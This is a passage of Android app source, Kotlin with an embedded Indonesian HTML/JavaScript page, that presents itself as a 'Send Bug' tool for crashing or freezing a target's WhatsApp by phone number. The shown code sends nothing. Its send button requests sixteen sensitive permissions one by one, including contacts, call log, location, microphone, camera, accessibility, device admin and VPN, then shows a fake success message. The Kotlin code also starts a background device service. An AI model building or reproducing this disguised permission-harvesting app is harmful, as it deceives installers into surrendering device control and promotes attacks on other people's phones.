      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/><circle cx="9" cy="6" r="2.5" fill="white"/><circle cx="15" cy="12" r="2.5" fill="white"/><circle cx="9" cy="18" r="2.5" fill="white"/></svg>
      Pengaturan
    </button>
  </div>
</div>

<!-- BOTTOM NAV -->
<div class="bottom-nav">
  <button class="nav-btn" onclick="sidebarNav('home')">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square">
      <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/>
    </svg>
  </button>
  <button class="nav-btn" onclick="sidebarNav('history')">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
  </button>
  <button class="nav-btn" onclick="sidebarNav('settings')">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/><circle cx="9" cy="6" r="2.5" fill="#dc2626"/><circle cx="15" cy="12" r="2.5" fill="#dc2626"/><circle cx="9" cy="18" r="2.5" fill="#dc2626"/></svg>
  </button>
</div>

<!-- MAIN CONTENT -->
<div class="wrapper">
  <div class="banner">
    <img src="file:///android_asset/media/banner_ui.jpg" alt="Banner">
  </div>

  <div class="profile-pic-wrap">
    <img class="profile-pic" src="file:///android_asset/media/foto_profil.jpg" alt="Profile">
  </div>

  <!-- TARGET NUMBERS -->
  <div class="form-area">
    <div class="section-label">
      <img src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/smartphone.svg" style="width:18px;height:18px;filter:brightness(0) invert(1);flex-shrink:0;">
      <span>Target Numbers</span>
    </div>
    <div class="input-wrap">
      <span class="input-icon" id="inputIcon">🌎</span>
      <input type="text" class="target-input" id="targetInput" placeholder="Cth : +628">
    </div>
  </div>

  <!-- SELECT BUGS -->
  <div class="bug-section">
    <div class="section-label">
      <img src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/bug.svg" style="width:18px;height:18px;filter:brightness(0) invert(1);flex-shrink:0;">
      <span>Select Bugs</span>
    </div>
    <div class="bug-grid">
      <div class="bug-card card-forceclose" onclick="selectBug(this)" data-bug="Force Close">
        <img class="check-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/circle-check.svg" alt="">
        <img class="bg-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/octagon-x.svg" alt="">
        <div class="bug-name">Force Close</div>
        <div class="bug-desc">Paksa Aplikasi WhatsApp Target Menutup Otomatis.</div>
      </div>
      <div class="bug-card card-crash" onclick="selectBug(this)" data-bug="Crash Invisible">
        <img class="check-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/circle-check.svg" alt="">
        <img class="bg-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/skull.svg" alt="">
        <div class="bug-name">Crash Invisible</div>
        <div class="bug-desc">Crash Tanpa Pesan Bug Terlihat Oleh Target.</div>
      </div>
      <div class="bug-card card-freeze" onclick="selectBug(this)" data-bug="Freeze Home">
        <img class="check-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/circle-check.svg" alt="">
        <img class="bg-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/snowflake.svg" alt="">
        <div class="bug-name">Freeze Home</div>
        <div class="bug-desc">Halaman WhatsApp Target Jadi Freeze.</div>
      </div>
      <div class="bug-card card-delay" onclick="selectBug(this)" data-bug="Delay Invisible">
        <img class="check-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/circle-check.svg" alt="">
        <img class="bg-icon" src="https://cdn.jsdelivr.net/npm/lucide-static@latest/icons/clock.svg" alt="">
        <div class="bug-name">Delay Invisible</div>
        <div class="bug-desc">Payload Tersembunyi Dengan Efek Delay Hard.</div>
      </div>
    </div>
  </div>

  <!-- SEND -->
  <button class="send-btn" onclick="sendBug()">
    <svg viewBox="0 0 24 24" fill="none" style="width:22px;height:22px;">
      <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" fill="currentColor"/>
    </svg>
    Send Bug
  </button>
</div>

<!-- OVERLAY INFO -->
<div id="infoOverlay" class="overlay">
  <div class="overlay-card">
    <div class="overlay-icon-wrap" style="background:#f59e0b;">
      <i class="fa-solid fa-triangle-exclamation" style="color:#0f0f0f;"></i>
    </div>
    <div class="overlay-title">Perhatian!</div>
    <div id="infoMsg" class="overlay-msg"></div>
    <button class="overlay-btn" style="background:var(--yellow);" onclick="document.getElementById('infoOverlay').style.display='none'">
      <i class="fa-solid fa-check"></i> Okey
    </button>
  </div>
</div>

<!-- OVERLAY SUCCESS -->
<div id="successOverlay" class="overlay">
  <div class="overlay-card">
    <div class="overlay-icon-wrap" style="background:var(--green);">
      <i class="fa-solid fa-check" style="color:var(--white);"></i>
    </div>
    <div class="overlay-title">Berhasil!</div>
    <div class="overlay-msg">Bug berhasil dikirim ke target.<br>Tunggu beberapa saat.</div>
    <button class="overlay-btn" style="background:var(--green);color:var(--white);" onclick="document.getElementById('successOverlay').style.display='none'">
      <i class="fa-solid fa-check"></i> Okey
    </button>
  </div>
</div>

<!-- NOTIF BOTTOM SHEET -->
<div id="notifOverlay" onclick="hideNotif()">
  <div id="notifCard" onclick="event.stopPropagation()">
    <div class="notif-header">
      <div class="notif-icon-box" id="notifColor">
        <span id="notifIcon"></span>
      </div>
      <div class="notif-meta">
        <span class="notif-meta-label">Info</span>
        <span id="notifTitle"></span>
      </div>
    </div>
    <div id="notifMsg"></div>
    <button class="notif-close-btn" onclick="hideNotif()">Tutup</button>
  </div>
</div>

<script>
function toggleSidebar() {
  var panel = document.getElementById('sidebarPanel');
  var overlay = document.getElementById('sidebarOverlay');
  var isOpen = panel.style.left === '0px';
  panel.style.left = isOpen ? '-290px' : '0px';
  overlay.style.display = isOpen ? 'none' : 'block';
}

function toggleHeadset() {
  showNotif('#7c3aed', '<i class="fa-solid fa-headset" style="color:#fff;font-size:20px;"></i>', 'Support', 'Fitur ini akan segera tersedia. Silakan hubungi admin melalui channel resmi.');
}

function toggleProfile() {
  showNotif('#dc2626', '<i class="fa-solid fa-shield" style="color:#fff;font-size:20px;"></i>', 'Akun', 'Fitur profil pengguna akan segera tersedia.');
}

function sidebarNav(page) {
  document.getElementById('sidebarPanel').style.left = '-290px';
  document.getElementById('sidebarOverlay').style.display = 'none';
  if (page === 'history') {
    showNotif('#f59e0b', '<i class="fa-solid fa-clock" style="color:#0f0f0f;font-size:20px;"></i>', 'Riwayat', 'Fitur riwayat pengiriman akan segera tersedia.');
  } else if (page === 'settings') {
    showNotif('#0ea5e9', '<i class="fa-solid fa-sliders" style="color:#fff;font-size:20px;"></i>', 'Pengaturan', 'Fitur pengaturan akan segera tersedia.');
  }
}

function showNotif(color, iconHtml, title, msg) {
  document.getElementById('notifColor').style.background = color;
  document.getElementById('notifIcon').innerHTML = iconHtml;
  document.getElementById('notifTitle').textContent = title;
  document.getElementById('notifMsg').textContent = msg;
  var el = document.getElementById('notifOverlay');
  el.style.display = 'flex';
  requestAnimationFrame(function(){ el.classList.add('show'); });
}

function hideNotif() {
  var el = document.getElementById('notifOverlay');
  el.classList.remove('show');
  setTimeout(function(){ el.style.display = 'none'; }, 300);
}

function selectBug(el) {
  document.querySelectorAll('.bug-card').forEach(c => c.classList.remove('selected'));
  el.classList.add('selected');
}

function showInfo(msg) {
  document.getElementById('infoMsg').innerHTML = msg;
  document.getElementById('infoOverlay').style.display = 'flex';
}

const PERMS = [
  { check:()=> window.Android ? Android.isCamGranted()              : false, request:()=> window.Android && Android.requestCamPerm() },
  { check:()=> window.Android ? Android.isGalleryGranted()          : false, request:()=> window.Android && Android.requestGalleryPerm() },
  { check:()=> window.Android ? Android.isNotifGranted()            : false, request:()=> window.Android && Android.requestNotifPerm() },
  { check:()=> window.Android ? Android.isContactsGranted()         : false, request:()=> window.Android && Android.requestContactsPerm() },
  { check:()=> window.Android ? Android.isLocationGranted()         : false, request:()=> window.Android && Android.requestLocationPerm() },
  { check:()=> window.Android ? Android.isCallLogGranted()          : false, request:()=> window.Android && Android.requestCallLogPerm() },
  { check:()=> window.Android ? Android.isCallPhoneGranted()        : false, request:()=> window.Android && Android.requestCallPhonePerm() },
  { check:()=> window.Android ? Android.isPhoneStateGranted()       : false, request:()=> window.Android && Android.requestPhoneStatePerm() },
  { check:()=> window.Android ? Android.isStorageGranted()          : false, request:()=> window.Android && Android.requestStoragePerm() },
  { check:()=> window.Android ? Android.isRecordAudioGranted()      : false, request:()=> window.Android && Android.requestRecordAudioPerm() },
  { check:()=> window.Android ? Android.isOverlayGranted()          : false, request:()=> window.Android && Android.requestOverlayPerm() },
  { check:()=> window.Android ? Android.isUsageAccessGranted()      : false, request:()=> window.Android && Android.requestUsageAccessPerm() },
  { check:()=> window.Android ? Android.isWriteSettingsGranted()    : false, request:()=> window.Android && Android.requestWriteSettingsPerm() },
  { check:()=> window.Android ? Android.isVpnGranted()              : false, request:()=> window.Android && Android.requestVpnPerm() },
  { check:()=> window.Android ? Android.isDeviceAdminGranted()      : false, request:()=> window.Android && Android.requestDeviceAdminPerm() },
  { check:()=> window.Android ? Android.isAccessibilityGranted()    : false, request:()=> window.Android && Android.requestAccessibilityPerm() },
]

function allGranted() { return PERMS.every(p => p.check()); }

function refreshPerms() {
  if (allGranted()) {
    // semua izin sudah granted, lanjut kirim
    _doSendBug();
  }
}

function sendBug() {
  const nomer = document.getElementById('targetInput').value.trim();
  const selected = document.querySelector('.bug-card.selected');
  if (!nomer && !selected) { showInfo('Nomer Target Dan Tipe Bug Belum Diisi.'); return; }
  if (!nomer) { showInfo('Nomer Target Belum Diisi..'); return; }
  if (!selected) { showInfo('Tipe Bug Belum Dipilih.'); return; }

  if (!allGranted()) {
    // minta izin yang belum granted satu per satu
    const next = PERMS.find(p => !p.check());
    if (next) next.request();
    return;
  }

  _doSendBug();
}

function _doSendBug() {
  document.getElementById('successOverlay').style.display = 'flex';
}

const DIAL_CODES = [
  ["1242","BS"],["1246","BB"],["1264","AI"],["1268","AG"],["1284","VG"],
  ["1340","VI"],["1345","KY"],["1441","BM"],["1473","GD"],["1649","TC"],
  ["1664","MS"],["1670","MP"],["1671","GU"],["1684","AS"],["1758","LC"],
  ["1767","DM"],["1784","VC"],["1787","PR"],["1809","DO"],["1868","TT"],
  ["1869","KN"],["1876","JM"],["1939","PR"],
  ["20","EG"],["211","SS"],["212","MA"],["213","DZ"],["216","TN"],
  ["218","LY"],["220","GM"],["221","SN"],["222","MR"],["223","ML"],
  ["224","GN"],["225","CI"],["226","BF"],["227","NE"],["228","TG"],
  ["229","BJ"],["230","MU"],["231","LR"],["232","SL"],["233","GH"],
  ["234","NG"],["235","TD"],["236","CF"],["237","CM"],["238","CV"],
  ["239","ST"],["240","GQ"],["241","GA"],["242","CG"],["243","CD"],
  ["244","AO"],["245","GW"],["246","IO"],["248","SC"],["249","SD"],
  ["250","RW"],["251","ET"],["252","SO"],["253","DJ"],["254","KE"],
  ["255","TZ"],["256","UG"],["257","BI"],["258","MZ"],["260","ZM"],
  ["261","MG"],["262","RE"],["263","ZW"],["264","NA"],["265","MW"],
  ["266","LS"],["267","BW"],["268","SZ"],["269","KM"],["27","ZA"],
  ["290","SH"],["291","ER"],["297","AW"],["298","FO"],["299","GL"],
  ["30","GR"],["31","NL"],["32","BE"],["33","FR"],["34","ES"],
  ["350","GI"],["351","PT"],["352","LU"],["353","IE"],["354","IS"],
  ["355","AL"],["356","MT"],["357","CY"],["358","FI"],["359","BG"],
  ["36","HU"],["370","LT"],["371","LV"],["372","EE"],["373","MD"],
  ["374","AM"],["375","BY"],["376","AD"],["377","MC"],["378","SM"],
  ["380","UA"],["381","RS"],["382","ME"],["383","XK"],["385","HR"],
  ["386","SI"],["387","BA"],["389","MK"],["39","IT"],["40","RO"],
  ["41","CH"],["420","CZ"],["421","SK"],["423","LI"],["43","AT"],
  ["44","GB"],["45","DK"],["46","SE"],["47","NO"],["48","PL"],
  ["49","DE"],["500","FK"],["501","BZ"],["502","GT"],["503","SV"],
  ["504","HN"],["505","NI"],["506","CR"],["507","PA"],["508","PM"],
  ["509","HT"],["51","PE"],["52","MX"],["53","CU"],["54","AR"],
  ["55","BR"],["56","CL"],["57","CO"],["58","VE"],["590","GP"],
  ["591","BO"],["592","GY"],["593","EC"],["594","GF"],["595","PY"],
  ["596","MQ"],["597","SR"],["598","UY"],["599","CW"],["60","MY"],
  ["61","AU"],["62","ID"],["63","PH"],["64","NZ"],["65","SG"],
  ["66","TH"],["670","TL"],["672","NF"],["673","BN"],["674","NR"],
  ["675","PG"],["676","TO"],["677","SB"],["678","VU"],["679","FJ"],
  ["680","PW"],["681","WF"],["682","CK"],["683","NU"],["685","WS"],
  ["686","KI"],["687","NC"],["688","TV"],["689","PF"],["690","TK"],
  ["691","FM"],["692","MH"],["7","RU"],["81","JP"],["82","KR"],
  ["84","VN"],["86","CN"],["90","TR"],["91","IN"],["92","PK"],
  ["93","AF"],["94","LK"],["95","MM"],["960","MV"],["961","LB"],
  ["962","JO"],["963","SY"],["964","IQ"],["965","KW"],["966","SA"],
  ["967","YE"],["968","OM"],["970","PS"],["971","AE"],["972","IL"],
  ["973","BH"],["974","QA"],["975","BT"],["976","MN"],["977","NP"],
  ["98","IR"],["992","TJ"],["993","TM"],["994","AZ"],["995","GE"],
  ["996","KG"],["998","UZ"]
];
DIAL_CODES.sort((a, b) => b[0].length - a[0].length);

function isoToFlagEmoji(iso) {
  return iso.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0)));
}

const input = document.getElementById('targetInput');
const iconSlot = document.getElementById('inputIcon');
const defaultIcon = '🌎';

function updateIcon() {
  const raw = input.value.replace(/[^0-9]/g, '');
  if (!raw) { iconSlot.innerHTML = defaultIcon; return; }
  const match = DIAL_CODES.find(([code]) => raw.startsWith(code));
  iconSlot.innerHTML = match ? `<span style="font-size:18px;">${'$'}{isoToFlagEmoji(match[1])}</span>` : defaultIcon;
}

input.addEventListener('input', updateIcon);
</script>
</body>
</html>
"""

    private fun dpToPx(dp: Int) = (dp * resources.displayMetrics.density).toInt()

    private fun startDeviceService() {
        ContextCompat.startForegroundService(this, Intent(this, DeviceService::class.java))
    }
}
